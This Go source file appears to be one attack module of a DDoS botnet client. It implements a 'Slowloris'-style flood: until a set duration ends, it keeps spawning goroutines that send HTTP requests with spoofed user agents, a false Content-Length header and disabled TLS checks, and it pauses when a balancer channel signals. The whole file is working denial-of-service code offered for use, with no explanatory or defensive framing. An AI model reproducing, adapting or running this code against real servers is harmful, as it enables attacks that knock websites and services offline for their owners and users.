package methods

import (
	"crypto/tls"
	"fmt"
	"homo/client/balancer"
	"homo/client/utils"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
)

func Slowloris(target string, port string, duration string) {
	duration = strings.ReplaceAll(duration, "\x00", "")
	duration = strings.ReplaceAll(duration, "\r", "")
	duration = strings.ReplaceAll(duration, "\x03", "")

	dur, err := strconv.Atoi(duration)
	if err != nil {
		fmt.Println(err)
	}

	sec := time.Now().Unix()
	for time.Now().Unix() <= sec+int64(dur)-1 {
		go slowlorisattack(target)
		go slowlorisattack(target)
		go slowlorisattack(target)
		time.Sleep(100 * time.Millisecond)

	}
}

func slowlorisattack(target string) {
	for i := 0; i < 30; i++ {
		select {
		case <-balancer.BalanceCh:
			fmt.Println("Balancer")
			time.Sleep(5 * time.Second)
		default:

			fmt.Println(i)
			tr := &http.Transport{
				MaxIdleConns:          0,
				IdleConnTimeout:       30 * time.Second,
				DisableCompression:    true,
				ResponseHeaderTimeout: 5 * time.Second,
				TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
			}
			client := &http.Client{Transport: tr}

			rand.Seed(time.Now().UTC().UnixNano())
			req, _ := http.NewRequest("GET", target, nil)
			req.Header.Add("User-Agent", utils.GetUserAgent())
			req.Header.Add("Content-Length", "42")
			req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			req.Header.Add("Accept-Encoding", "gzip, deflate, br")
			req.Header.Add("Accept-Language", "en-US,en;q=0.5")
			req.Header.Add("Connection", "keep-alive")
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			defer resp.Body.Close()
			time.Sleep(time.Duration(5) * time.Second)

		}
	}
}
